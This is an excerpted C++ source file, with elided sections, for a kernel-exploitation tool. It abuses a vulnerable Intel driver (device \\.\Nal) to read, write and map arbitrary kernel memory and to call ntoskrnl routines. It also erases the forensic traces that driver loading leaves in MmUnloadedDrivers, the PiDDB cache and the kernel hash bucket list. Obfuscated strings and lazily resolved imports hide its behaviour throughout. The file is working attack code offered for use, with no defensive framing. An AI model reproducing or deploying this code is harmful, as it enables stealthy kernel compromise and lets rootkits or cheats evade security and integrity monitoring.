...
bool intel_driver::IsRunning() {
	const HANDLE file_handle = LI_FN(CreateFileW).get()(xorstr_(L"\\\\.\\Nal"), FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
...
HANDLE intel_driver::Load() {
	srand((unsigned)time(NULL) * LI_FN(GetCurrentThreadId)());
	...
	LI_FN(memset)(intel_driver::driver_name, 0, sizeof(intel_driver::driver_name));
	...
	LI_FN(_wremove)(driver_path.c_str());
	...
	HANDLE result = LI_FN(CreateFileW).get()(xorstr_(L"\\\\.\\Nal"), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	...
	ntoskrnlAddr = utils::GetKernelModuleAddress(xorstr_("ntoskrnl.exe"));
	if (ntoskrnlAddr == 0) {
...
bool intel_driver::Unload(HANDLE device_handle) {
	...
	if (device_handle && device_handle != INVALID_HANDLE_VALUE) {
		LI_FN(CloseHandle).get()(device_handle);
	}
	...
	//unlink the file
	if (LI_FN(_wremove)(driver_path.c_str()) != 0)
		return false;
...
bool intel_driver::MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size) {
	...
	return LI_FN(DeviceIoControl).get()(device_handle, ioctl1, &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}
...
bool intel_driver::SetMemory(HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size) {
	...
	DWORD bytes_returned = 0;
	return LI_FN(DeviceIoControl).get()(device_handle, ioctl1, &fill_memory_buffer, sizeof(fill_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}
...
bool intel_driver::GetPhysicalAddress(HANDLE device_handle, uint64_t address, uint64_t* out_physical_address) {
	...
	if (!LI_FN(DeviceIoControl).get()(device_handle, ioctl1, &get_phys_address_buffer, sizeof(get_phys_address_buffer), nullptr, 0, &bytes_returned, nullptr))
		return false;
...
uint64_t intel_driver::MapIoSpace(HANDLE device_handle, uint64_t physical_address, uint32_t size) {
	...
	if (!LI_FN(DeviceIoControl).get()(device_handle, ioctl1, &map_io_space_buffer, sizeof(map_io_space_buffer), nullptr, 0, &bytes_returned, nullptr))
		return 0;
...
bool intel_driver::UnmapIoSpace(HANDLE device_handle, uint64_t address, uint32_t size) {
	...
	return LI_FN(DeviceIoControl).get()(device_handle, ioctl1, &unmap_io_space_buffer, sizeof(unmap_io_space_buffer), nullptr, 0, &bytes_returned, nullptr);
}
...
{
	static uint64_t kernel_MmAllocatePagesForMdl = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, xorstr_("MmAllocatePagesForMdl"));
...
{
	static uint64_t kernel_MmMapLockedPagesSpecifyCache = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, xorstr_("MmMapLockedPagesSpecifyCache"));
...
{
	static uint64_t kernel_MmProtectMdlSystemAddress = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, xorstr_("MmProtectMdlSystemAddress"));
...
{
	static uint64_t kernel_MmUnmapLockedPages = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, xorstr_("MmUnmapLockedPages"));
...
{
	static uint64_t kernel_MmFreePagesFromMdl = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, xorstr_("MmFreePagesFromMdl"));
...
uint64_t intel_driver::AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size) {
	...
	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, xorstr_("ExAllocatePoolWithTag"));
...
bool intel_driver::FreePool(HANDLE device_handle, uint64_t address) {
	...
	static uint64_t kernel_ExFreePool = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, xorstr_("ExFreePool"));
...
uint64_t intel_driver::GetKernelModuleExport(HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name) {
	...
	const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(LI_FN(VirtualAlloc).get()(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (!ReadMemory(device_handle, kernel_module_base + export_base, export_data, export_base_size))
	{
		LI_FN(VirtualFree).get()(export_data, 0, MEM_RELEASE);
		return 0;
	}
	...
	for (auto i = 0u; i < export_data->NumberOfNames; ++i) {
		...
		if (!LI_FN(_stricmp)(current_function_name.c_str(), function_name.c_str())) {
...
bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle) {
	...
	NTSTATUS status = LI_FN(NtQuerySystemInformation).get()(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);

	while (status == nt::STATUS_INFO_LENGTH_MISMATCH)
	{
		LI_FN(VirtualFree).get()(buffer, 0, MEM_RELEASE);

		buffer = LI_FN(VirtualAlloc).get()(nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		status = LI_FN(NtQuerySystemInformation)(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);
	}
	...
	for (auto i = 0u; i < system_handle_inforamtion->HandleCount; ++i)
	{
		...
		if (current_system_handle.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(LI_FN(GetCurrentProcessId)())))
			continue;
	...
	LI_FN(memset)(unloadedName, 0, us_driver_base_dll_name.Length + sizeof(wchar_t));
...
bool intel_driver::ExAcquireResourceExclusiveLite(HANDLE device_handle, PVOID Resource, BOOLEAN wait) {
	...
	static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, xorstr_("ExAcquireResourceExclusiveLite"));
...
bool intel_driver::ExReleaseResourceLite(HANDLE device_handle, PVOID Resource) {
	...
	static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, xorstr_("ExReleaseResourceLite"));
...
BOOLEAN intel_driver::RtlDeleteElementGenericTableAvl(HANDLE device_handle, PVOID Table, PVOID Buffer) {
	...
	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, xorstr_("RtlDeleteElementGenericTableAvl"));
...
PVOID intel_driver::RtlLookupElementGenericTableAvl(HANDLE device_handle, PRTL_AVL_TABLE Table, PVOID Buffer) {
	...
	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, xorstr_("RtlLookupElementGenericTableAvl"));
...
intel_driver::PiDDBCacheEntry* intel_driver::LookupEntry(HANDLE device_handle, PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t * name) {
	...
	localentry.DriverName.Length = (USHORT)(LI_FN(wcslen)(name) * 2);
...
bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
	...
	while (entry) {
		...
		if (expected_len == wsNameLen) {
			...
			LI_FN(memset)(wsName, 0, wsNameLen + sizeof(wchar_t));
